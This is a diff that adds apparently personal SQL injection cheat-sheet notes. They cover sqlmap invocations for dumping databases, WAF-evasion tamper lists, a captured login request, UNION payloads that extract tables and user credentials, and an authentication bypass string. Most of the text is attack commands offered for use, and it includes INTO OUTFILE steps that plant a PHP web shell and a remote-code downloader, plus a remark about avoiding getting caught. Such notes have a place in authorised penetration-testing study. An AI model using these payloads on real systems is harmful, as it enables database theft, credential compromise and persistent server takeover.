@@ -1,0 +1,184 @@
+SQL
+###SQLMAP 
+
+
+sqlmap -r report.req --dbms=mysql --technique=U --dbms mysql --level 5 --risk 3 -p id --dump
+
+-r is the file name
+--dbms is the database type
+--technique is the type - U is union
+-p is the parameter, in this case the parameter that is vulnerable is id
+--level checks everything, user agents, cookies, all parameters
+--risk will blow up how much traffic you generate and might get you caught
+
+
+####SQLmap post parameter shit
+
+see the request below?  add it to a text file and save whatever request you are attempting to exploit
+
+then
+
+select which parameter - in this parameter, the post requests you can check user, admin, and pass
+
+so, if you wanna check user parameter, do this
+
+sqlmap -r this-filename.txt -p user
+
+or if you wanna check the pass field, do this
+
+sqlmap -r this-filename.txt -p pass
+
+get it? got it? good
+
+
+POST /?page=login HTTP/1.1
+Host: 192.168.91.129
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.91.129/?page=login
+Cookie: PHPSESSID=81uqq56dr9jb3o35qa2jdv0u61
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 50
+
+user=admin&pass=admin&submit=Login
+
+
+
+**********
+MySQL tampering
+tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
+
+MSSQL tampering
+tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
+
+General Tampering
+tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
+
+--------------------------
+sqlmap -u 'http://1.sqli.labs/' -p user-agent --random-agent --banner
+
+sqlmap -r /root/Desktop/request.txt -p --user agent
+
+sqlmap -u http://5.sqli.labs -p user-agent --random-agent --banner --tamper=randomcase,space2comment,apostrophemask,informationschemacomment
+
+
+-------------------
+
+
+IP-address/cat.php?id=1 UNION SELECT 1,@@version,3,4--
+
+IP-address/cat.php?id=1 UNION SELECT 1,database(),3,4--
+
+IP-address/cat.php?id=1 UNION SELECT 1,current_user(),3,4--
+
+IP-address/cat.php?id=1 UNION SELECT 1,@@datadir,3,4--
+
+IP-address/cat.php?id=1 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()--
+
+IP-address/cat.php?id=1 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name="users"--
+
+IP-address/cat.php?id=1 UNION SELECT 1,group_concat(id,0x3a,login,0x3a,password),3,4 FROM photoblog.users--
+
+
+
+
+' OR '1'='1
+
+
+
+
+To write a PHP shell:
+o    SELECT '<? system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';
+ 
+o    and then access it at:
+o    http://localhost/shell.php?c=cat%20/etc/passwd
+o    To write a downloader:
+o    SELECT '<? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/get.php'
+ 
+o    and then access it at:
+o    http://localhost/get.php?f=shell.php&u=__URLSTART__http://localhost/c99.txt
+
+-----------------
+
+2nd Order SQL
+
+# Down below change the injection URL into what you need I.E. instead of selfie4you.com type in google #or whatever you are attacking.
+#
+# sqlmap -u 'http://127.0.0.1/2ndOrderPAYLOAD.php?payload=x' --technique=U \r\n
+#
+# Usage http://127.0.0.1/2ndOrderPAYLOAD.php?payload=' union select user(); -- -*****enter in malicious payload \r\n
+#
+#-------------------
+ 
+https://websec.ca/kb/sql_injection
+
+
+-------------------------------------------------------
+
+/usr/share/sqlmap/tamper/__init__.py
+/usr/share/sqlmap/tamper/apostrophemask.py
+/usr/share/sqlmap/tamper/apostrophenullencode.py
+/usr/share/sqlmap/tamper/appendnullbyte.py
+/usr/share/sqlmap/tamper/base64encode.py
+/usr/share/sqlmap/tamper/between.py
+/usr/share/sqlmap/tamper/between.pyc
+/usr/share/sqlmap/tamper/bluecoat.py
+/usr/share/sqlmap/tamper/chardoubleencode.py
+/usr/share/sqlmap/tamper/charencode.py
+/usr/share/sqlmap/tamper/charencode.pyc
+/usr/share/sqlmap/tamper/charunicodeencode.py
+/usr/share/sqlmap/tamper/charunicodeencode.pyc
+/usr/share/sqlmap/tamper/commalessmid.py
+/usr/share/sqlmap/tamper/concat2concatws.py
+/usr/share/sqlmap/tamper/equaltolike.py
+/usr/share/sqlmap/tamper/equaltolike.pyc
+/usr/share/sqlmap/tamper/greatest.py
+/usr/share/sqlmap/tamper/greatest.pyc
+/usr/share/sqlmap/tamper/halfversionedmorekeywords.py
+/usr/share/sqlmap/tamper/ifnull2ifisnull.py
+/usr/share/sqlmap/tamper/informationschemacomment.py
+/usr/share/sqlmap/tamper/lowercase.py
+/usr/share/sqlmap/tamper/modsecurityversioned.py
+/usr/share/sqlmap/tamper/modsecurityzeroversioned.py
+/usr/share/sqlmap/tamper/multiplespaces.py
+/usr/share/sqlmap/tamper/multiplespaces.pyc
+/usr/share/sqlmap/tamper/nonrecursivereplacement.py
+/usr/share/sqlmap/tamper/nonrecursivereplacement.pyc
+/usr/share/sqlmap/tamper/overlongutf8.py
+/usr/share/sqlmap/tamper/percentage.py
+/usr/share/sqlmap/tamper/randomcase.py
+/usr/share/sqlmap/tamper/randomcase.pyc
+/usr/share/sqlmap/tamper/randomcomments.py
+/usr/share/sqlmap/tamper/securesphere.py
+/usr/share/sqlmap/tamper/sp_password.py
+/usr/share/sqlmap/tamper/space2comment.py
+/usr/share/sqlmap/tamper/space2comment.pyc
+/usr/share/sqlmap/tamper/space2dash.py
+/usr/share/sqlmap/tamper/space2dash.pyc
+/usr/share/sqlmap/tamper/space2hash.py
+/usr/share/sqlmap/tamper/space2morehash.py
+/usr/share/sqlmap/tamper/space2mssqlblank.py
+/usr/share/sqlmap/tamper/space2mssqlhash.py
+/usr/share/sqlmap/tamper/space2mysqlblank.py
+/usr/share/sqlmap/tamper/space2mysqldash.py
+/usr/share/sqlmap/tamper/space2mysqldash.pyc
+/usr/share/sqlmap/tamper/space2plus.py
+/usr/share/sqlmap/tamper/space2randomblank.py
+/usr/share/sqlmap/tamper/symboliclogical.py
+/usr/share/sqlmap/tamper/symboliclogical.pyc
+/usr/share/sqlmap/tamper/unionalltounion.py
+/usr/share/sqlmap/tamper/unmagicquotes.py
+/usr/share/sqlmap/tamper/unmagicquotes.pyc
+/usr/share/sqlmap/tamper/uppercase.py
+/usr/share/sqlmap/tamper/uppercase.pyc
+/usr/share/sqlmap/tamper/varnish.py
+/usr/share/sqlmap/tamper/versionedkeywords.py
+/usr/share/sqlmap/tamper/versionedmorekeywords.py
+/usr/share/sqlmap/tamper/xforwardedfor.py
+/usr/share/sqlmap/tamper/xforwardedfor.pyc
+
+
+
